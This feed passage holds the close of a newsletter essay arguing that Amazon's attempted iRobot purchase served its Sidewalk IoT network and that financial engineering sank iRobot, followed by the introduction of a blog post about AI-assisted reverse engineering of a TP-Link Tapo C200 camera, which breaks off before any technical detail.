href="https://www.wsj.com/tech/amazon-alexa-devices-echo-losses-strategy-25f2581a?gaa_at=eafs&amp;gaa_n=AWEtsqdfXRSaceVjg_5A9Lo_20Wf30Xh_EQyLk1MS7weaLCB8GO5ZiX2ruw8qOupjUk%3D&amp;gaa_ts=694423f0&amp;gaa_sig=4RIOPDy4JL9FJ44zG_mF-QV0SLfN0oBvr8AUTtS9cFI_Xf4cqCc15_p4o1s-DsvLe6PSAHWZWS766CRa7v_vDQ%3D%3D" rel="">lost</a><span> more than $25 billion in losses from its devices business.” </span></p><p><span>But Amazon continued. In 2022, it </span><a href="https://www.prnewswire.com/news-releases/amazon-and-irobot-sign-an-agreement-for-amazon-to-acquire-irobot-301600720.html" rel="">announced</a><span> the acquisition of iRobot for $1.7 billion. This deal would seemingly solve iRobot’s problems stemming from a lack of research and production capacity. It would also make people very wealthy. Angle himself would </span><a href="https://www.sec.gov/Archives/edgar/data/1159167/000119312523220091/d496206ddefm14a.htm" rel="">receive</a><span> $14 million upon completion of the deal, and the entire executive team would be paid lavishly.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!WO9I!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!WO9I!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png 424w, https://substackcdn.com/image/fetch/$s_!WO9I!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png 848w, https://substackcdn.com/image/fetch/$s_!WO9I!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png 1272w, https://substackcdn.com/image/fetch/$s_!WO9I!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!WO9I!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png" width="881" height="272" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:272,&quot;width&quot;:881,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:77178,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://www.thebignewsletter.com/i/181986493?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!WO9I!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png 424w, https://substackcdn.com/image/fetch/$s_!WO9I!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png 848w, https://substackcdn.com/image/fetch/$s_!WO9I!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png 1272w, https://substackcdn.com/image/fetch/$s_!WO9I!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><span>Nevertheless, Amazon is a very powerful firm, so the FTC, as well as European enforcers, began an investigation. In late 2023, the Europeans issued a </span><a href="https://ec.europa.eu/commission/presscorner/detail/en/ip_23_5990" rel="">preliminary statement of objections</a><span>, which isn’t a formal challenge but a note to Amazon suggesting there might be problems. The EU argued that Amazon might self-preference its robot vacuum cleaners on its ubiquitous marketplace, and thwart competition. </span></p><p><span>The FTC didn’t bring a challenge, but nevertheless, in 2024, Amazon and iRobot </span><a href="https://investor.irobot.com/news-releases/news-release-details/amazon-and-irobot-agree-terminate-pending-acquisition" rel="">called</a><span> off the deal. The FTC issued a vague statement announcing it was pleased with the end of the transaction. “The Commission’s probe focused on Amazon’s ability and incentive to favor its own products and disfavor rivals’,” it </span><a href="https://www.ftc.gov/news-events/news/press-releases/2024/01/statement-regarding-termination-amazons-proposed-acquisition-irobot" rel="">wrote</a><span>, “and associated effects on innovation, entry barriers, and consumer privacy. The Commission’s investigation revealed significant concerns about the transaction’s potential competitive effects.” </span></p><p>I don’t know what the FTC found, that’s confidential. But I spoke with a former employee of Ring and Latch who explained Amazon’s monopolization strategy. This person’s view is that Amazon wasn’t trying to dominate the robot vacuum cleaner market for its own sake, but as part of a much bigger plan. With Ring, Eero, Alexa, and iRobot devices, Amazon would have the largest network of consumer internet of things (IoT) devices in the world. Here’s what this person argued about this set of acquisitions:</p><blockquote><p>Amazon wanted Ring for Iotera, a company Ring acquired in late 2017. Iotera built a proprietary protocol for smart devices. Internally, it was known as RingNet, but now it is known as Amazon Sidewalk. Unlike Wifi, Bluetooth, Zigbee, or Z-Wave, Sidewalk requires users to use the Alexa ecosystem. Amazon has grown its Sidewalk network via Alexa and Ring devices sold below cost and acquisitions of companies like Eero and soon, iRobot.</p></blockquote><p>As these devices can connect with each other, they would become the “basis of a physical network connecting devices and sensors all over the world.”  This argument isn’t speculation; my source was the first Ringnet/sidewalk product manager at Ring, directly responsible for integrating Iotera technology into Ring camera, Mr. Beams, and Ring Alarm. This person wrote strategy docs, organized legal/business requirements, and coordinated hardware and software development across all the different units. </p><p><span>There’s also a lot of public evidence. Here’s Amazon describing </span><a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=GN9U5W9UZU2G5VBW" rel="">this network</a><span>:</span></p><blockquote><p>Amazon Sidewalk creates a low-bandwidth network with the help of Sidewalk Bridge devices including select Echo and Ring devices. These Bridge devices share a small portion of your internet bandwidth which is pooled together to provide these services to you and your neighbors. And when more neighbors participate, the network becomes even stronger.</p></blockquote><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!Geyn!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!Geyn!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png 424w, https://substackcdn.com/image/fetch/$s_!Geyn!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png 848w, https://substackcdn.com/image/fetch/$s_!Geyn!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png 1272w, https://substackcdn.com/image/fetch/$s_!Geyn!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!Geyn!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png" width="1019" height="715" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/a01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:715,&quot;width&quot;:1019,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:196022,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://www.thebignewsletter.com/i/181986493?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!Geyn!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png 424w, https://substackcdn.com/image/fetch/$s_!Geyn!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png 848w, https://substackcdn.com/image/fetch/$s_!Geyn!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png 1272w, https://substackcdn.com/image/fetch/$s_!Geyn!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption><span>This </span><a href="https://docs.sidewalk.amazon/introduction/sidewalk-how-works.html" rel="">image</a><span> comes from Amazon’s documentation on how Sidewalk works.</span></figcaption></figure></div><p><span>Amazon even </span><a href="https://techcrunch.com/2025/11/16/amazon-satellite-network-gets-a-rebrand-and-drops-its-affordability-pitch/" rel="">renamed</a><span> its satellite service, Project Kuiper, to Leo, pivoting away from consumer access a la Starlink to fostering this IoT backbone. Sidewalk would let consumers stay connected, without broadband, through a proprietary surveillance heavy Amazon-run network.</span></p><p><span>This situation probably set off alarm bells among enforcers. Amazon has a vast surveillance apparatus, and its devices business had already been </span><a href="https://www.ftc.gov/news-events/news/press-releases/2023/05/ftc-doj-charge-amazon-violating-childrens-privacy-law-keeping-kids-alexa-voice-recordings-forever" rel="">charged</a><span> multiple times by the government with violating privacy laws.  </span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!dyTX!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!dyTX!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png 424w, https://substackcdn.com/image/fetch/$s_!dyTX!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png 848w, https://substackcdn.com/image/fetch/$s_!dyTX!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png 1272w, https://substackcdn.com/image/fetch/$s_!dyTX!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!dyTX!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png" width="1298" height="477" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:477,&quot;width&quot;:1298,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:105950,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://www.thebignewsletter.com/i/181986493?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!dyTX!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png 424w, https://substackcdn.com/image/fetch/$s_!dyTX!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png 848w, https://substackcdn.com/image/fetch/$s_!dyTX!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png 1272w, https://substackcdn.com/image/fetch/$s_!dyTX!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><span>At one point, Ring was </span><a href="https://www.ftc.gov/news-events/news/press-releases/2023/05/ftc-says-ring-employees-illegally-surveilled-customers-failed-stop-hackers-taking-control-users" rel="">accused</a><span> of “allowing any employee or contractor to access consumers’ private videos and by failing to implement basic privacy and security protections, enabling hackers to take control of consumers’ accounts, cameras, and videos.” One government complaint alleged that a Ring employee “viewed thousands of video recordings belonging to female users of Ring cameras that surveilled intimate spaces in their homes such as their bathrooms or bedrooms.” And it wasn’t just the FTC, there was </span><a href="https://blog.helium.com/the-people-v-amazon-fc7adff28e3c" rel="">substantial</a><span> </span><a href="https://www.wired.com/story/how-amazon-sidewalk-works/" rel="">concern</a><span> from rivals and consumer advocates over Amazon’s use of Sidewalk to open up a new path to surveil consumers. </span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!zuIe!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!zuIe!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png 424w, https://substackcdn.com/image/fetch/$s_!zuIe!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png 848w, https://substackcdn.com/image/fetch/$s_!zuIe!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png 1272w, https://substackcdn.com/image/fetch/$s_!zuIe!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!zuIe!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png" width="1298" height="571" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/b45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:571,&quot;width&quot;:1298,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:297074,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://www.thebignewsletter.com/i/181986493?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/$s_!zuIe!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png 424w, https://substackcdn.com/image/fetch/$s_!zuIe!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png 848w, https://substackcdn.com/image/fetch/$s_!zuIe!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png 1272w, https://substackcdn.com/image/fetch/$s_!zuIe!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><span>It wasn’t just a consumer strategy. Amazon is now selling </span><a href="https://press.aboutamazon.com/2023/3/amazon-invites-developers-to-test-sidewalk-and-build-the-next-billion-connected-devices" rel="">access</a><span> to Sidewalk to industrial customers, linking access to Sidewalk to its cloud computing service Amazon Web Services. In other words, Amazon was seeking to become the proprietary backbone for any industrial firm who wants to link a device with 90% of America, outside of cellular networks, and that could include maps of most homes and neighborhoods. Amazon spent $25 billion on its device network, and would have been perfectly happy to engage in self-preferencing and predatory pricing of iRobot products to further its aims. </span></p><p>After this acquisition, Amazon would add iRobot’s suite of products and IP to its own portfolio, as well as the rich network and stream of data. But such a merger likely wouldn’t have helped prevent national security problems or kept robotics capacity in the U.S. Amazon is known to be aggressive about ensuring that production happens in China, so it’s almost a certainty manufacturing would continue there, and Chinese firms would likely still come to dominate most non-U.S. and European markets. For Amazon, the goal was the network, not to make robots.</p><p><span>When the deal fell apart, Amazon </span><a href="https://techcrunch.com/2025/12/14/how-irobot-lost-its-way-home/" rel="">paid</a><span> iRobot a $94 million break-up fee, which could be significantly more than the cost of litigating a case, so it is clear the two firms thought the FTC could have challenged it and might have won. After the failed merger, Angle stepped down as CEO, but expressed optimism, saying that “iRobot now turns toward the future with a focus and commitment to continue building thoughtful robots and intelligent home innovations that make life better, and that our customers around the world love.”</span></p><p><span>In 2024, when the two firms decided not to move forward with the deal, iRobot hired a “turnaround” specialist named Gary Cohen to run iRobot. The Carlyle Group </span><a href="https://www.bloomberg.com/news/articles/2025-12-16/carlyle-loses-over-100-million-on-soured-loan-to-roomba-maker" rel="">had lent</a><span> $200 million to iRobot to help the company get through the merger, and when that merger fell apart, it </span><a href="https://www.reuters.com/technology/amazons-abandoned-acquisition-leaves-irobot-carlyle-debt-straightjacket-2024-01-31/" rel="">ended</a><span> up taking nearly 80% of the breakup fee. </span></p><p>Could iRobot have continued as a viable firm? Well Angle publicly said it could, and iRobot executives almost certainly framed it that way to the FTC. Had iRobot truly been insolvent, they could have used a legal argument known as a “failing firm” defense, meaning explaining to regulators they would have gone out of business without a merger. But that would have likely caused Amazon to reduce the price it would have paid to shareholders, including, presumably, the golden parachutes going to the executive team of iRobot. </p><p>By 2025, the board likely concluded that iRobot could never get the high returns on capital that its board of financiers expected. The losing battle with Red Mountain Capital in 2016 had taught Angle not to build robots and innovative products, but to asset strip. When his company actually had to once again build, they threw in the towel. Carlyle sold the remaining debt at a loss to Shenzhen, which then seized the remaining branding and intellectual property. </p><p>There’s an interesting question about whether Shenzhen should be allowed to acquire iRobot, but which involves not only antitrust, but foreign acquisitions and national security. There is a government body that makes such decisions. It’s called the Committee on Foreign Investment in the U.S., or CFIUS. And CFIUS, which presumably allowed this acquistion, is led by… Treasury Secretary Scott Bessent. </p><p>In other words, the story here is Wall Street destroying a promising robotics enterprise through financial engineering, aiding the Chinese in the process, and then demanding a bailout via amnesty from antitrust laws so that shareholders wouldn’t lose any money, while refusing to acknowledge that a key Trump ally of Wall Street facilitated the transfer of the firm to China.</p><p>Of course, this bad faith is routine. None of the critics of antitrust enforcement, including Furman, care if U.S. technology flows to China or if companies fail. They in fact celebrated offshoring when it happened to 90,000 manufacturing plants from 2000 onward, and they often make the point that failure is part of capitalism. But when it comes to one specific company, where they can cherry pick information to make a case against antitrust, well then, all of a sudden iRobot’s bankruptcy is a disaster. </p><p>All that said, there is an important lesson here for anti-monopolists. Antitrust is a useful tool, but it cannot substitute for a broader national economic development strategy. Right now, America, through a whole set of policy choices, from bailouts to government contracts to pro-speculation regulations to attacks on the rights of labor and creators, ensures that financiers get an unfairly high return on capital. We can see the consequences in everything from the collapse of iRobot to the destruction of America’s cattle herd to the erosion of capacity in Hollywood to the financialized AI data center build-out. The business of America right now is extraction, not creation.</p><p>To reverse this strategy, a more assertive antitrust regime is necessary, but it’s not enough. We also have to reduce the many other public levers of support for elevated returns on capital. Only then will it make sense for companies like iRobot to invest in robots instead of share buybacks. </p><p><span>Thanks for reading! Your tips make this newsletter what it is, so please send me tips on weird monopolies, stories I’ve missed, or other thoughts. And if you liked this issue of BIG, you can sign up </span><a href="http://email.mg1.substack.com/c/eJxVUMFuwyAM_ZpwjIAmYT34UHXtb0QEnBSNQARmVf5-pN1hkyzberae37PRhEtMOxBmYiVjGp0FZoEradTEXB7nhLhq54FtZfLOaHIxHFtC9LJjDzhxNUs7nKTlnGsthRKDmj-s4dIYO0i2xUyjLtZhMAj4jWmPAZmHB9GWm9OlkfcaqybKFL3H1OYyZdLmqzVxraMn-togcyC5OPNzzT3ve9WKVnS3y5WL4a54d1PdZ9PxdRH_CFiCX946XA4vL7TaGWtdS3C0jxj05NECpYKM3v94Cad9Qwj4zB6JML3Bw74chFCsHrKxcgb4o_8H-RJ1Kg" rel="">here</a><span> for more issues, a newsletter on how to restore fair commerce, innovation, and democracy. Consider becoming a </span><a href="https://email.mg1.substack.com/c/eJxVUMtuwyAQ_JpwtABjEw4ceulvIB6Lg4rBgrUq_31J0kO7Wmk1-xrNeIuw1XZphI7kqB0NXgfoAt89AyI0cnZoJgVNgqaSe-lI6iY2gN2mrMlxupy8xVTLc4uxhQvy0DZKpyjQIL31CqigggOPQYWBIqg3lz1DguJB15Ivc9gUSNYPxKPf5o8b_xy5W8SONWdoUz9dR-u_Jl_3MXpC35IDkjSnnI2Y6cwkZROfhIwuSrXauC7e2_u0rNhtvJaboPvG_v0iTf9SjOH21PXqDmlm1P0sCS8DxboMQWM7geDbsJcHZoMCbRgZjEXN1nmVchaci5W9VQ5bxEzlXVFFBm2o46roP8J-AJJ0hnE" rel="">paying subscriber</a><span> to support this work, or if you are a paying subscriber, giving a </span><a href="https://email.mg1.substack.com/c/eJxVUEtuxSAMPE1YRnwSSBYsKlW9BiJgUlQCETiqcvvy3uuitSxZ9tgezTiLsJd6a4SG5CwNDd4n6AzfLQEiVHI1qCZ6Tbymiju1kdhMqACHjUmT89pSdBZjyY8txmY-kU_tOZOU-bB5urhl9ouc-RomtnoXpOX0xWUvHyE70CWn25w2epL0J-LZBvE28I-eh0VsWFKCOrZra2jd1-jK0aFH62rcYBB9U-4x4CDesV5AouaUsx6CCqYoG_k4qbAFtUob5OycXcZZYrPhnoeJHjv795xU_cvZwf0h9DntWk2vx5Uj3gay3RJ4_STEl4NPU8wOGWp31huLmkkhlRIT55NkL9ndp0lQtax0JZ3Wl36V9R-lPyvjiqk" rel="">gift subscription</a><span> to a friend, colleague, or family member. If you really liked it, read my book, </span><a href="https://www.simonandschuster.com/books/Goliath/Matt-Stoller/9781501183089" rel="">Goliath: The 100-Year War Between Monopoly Power and Democracy</a><span>.</span></p><p>cheers,</p><p>Matt Stoller</p></div></article></div><div><div id="discussion"><h4>Discussion about this post</h4></div><div><h3>Ready for more?</h3></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[TP-Link Tapo C200: Hardcoded Keys, Buffer Overflows and Privacy (318 pts)]]></title>
            <link>https://www.evilsocket.net/2025/12/18/TP-Link-Tapo-C200-Hardcoded-Keys-Buffer-Overflows-and-Privacy-in-the-Era-of-AI-Assisted-Reverse-Engineering/</link>
            <guid>46329038</guid>
            <pubDate>Fri, 19 Dec 2025 18:19:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.evilsocket.net/2025/12/18/TP-Link-Tapo-C200-Hardcoded-Keys-Buffer-Overflows-and-Privacy-in-the-Era-of-AI-Assisted-Reverse-Engineering/">https://www.evilsocket.net/2025/12/18/TP-Link-Tapo-C200-Hardcoded-Keys-Buffer-Overflows-and-Privacy-in-the-Era-of-AI-Assisted-Reverse-Engineering/</a>, See on <a href="https://news.ycombinator.com/item?id=46329038">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    <p>Hi friends and welcome to the last post for this year! Whenever someone asks me how to get started with reverse engineering, I always give the same advice: buy the cheapest IP camera you can find. These devices are self-contained little ecosystems - they have firmware you can extract, network protocols you can sniff, and mobile apps you can decompile. Chances are, you’ll find something interesting. At worst, you’ll learn a lot about assembly and embedded systems. At best, you’ll find some juicy vulnerability and maybe learn how to exploit it!</p>
<p><img src="https://www.evilsocket.net/images/2025/tapo/header.jpg" alt="tp-link tapo c200"></p>
<p>I own several TP-Link Tapo C200 cameras myself. They’re cheap (less than 20 EUR from Italy), surprisingly stable, and I genuinely like them - they just work. One weekend, I decided just for fun to take my own advice. The Tapo C200 has been around for a while and has had <a target="_blank" rel="noopener" href="https://www.cvedetails.com/vulnerability-list/vendor_id-11936/product_id-83493/Tp-link-Tapo-C200-Firmware.html">a few CVEs</a> discovered and more or less patched over the years, so I honestly wasn’t expecting to find much in the latest firmware. However, I wanted to use this chance to perform some <strong>AI assisted reverse engineering</strong> and test whether I could still find anything at all.</p>
<p>I documented the entire process live on <a target="_blank" rel="noopener" href="https://discord.com/channels/1100085665766572142/1396102661257957396">Arcadia</a> - my thought process, the dead ends, the AI prompts that worked and the ones that didn’t. If you want the raw, unfiltered version with screenshots and videos of things crashing, go check that out.</p>
